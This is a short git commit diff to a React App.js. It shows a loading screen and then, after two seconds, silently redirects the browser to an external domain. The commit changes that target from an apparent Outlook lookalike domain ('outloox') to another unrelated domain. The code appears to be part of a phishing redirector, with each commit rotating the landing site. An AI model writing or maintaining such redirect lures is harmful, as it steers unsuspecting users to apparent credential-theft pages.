8bfbcb798b35c51859f27badace9d1e5d893b264
husknet <127146284+husknet@users.noreply.github.com>
2024-12-10 15:42:56 +0000

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outloox.dinprima.ro/';
+            window.location.href = 'https://online.rabsacca.com/';
         }, 2000);
 
         return () => clearTimeout(timer);
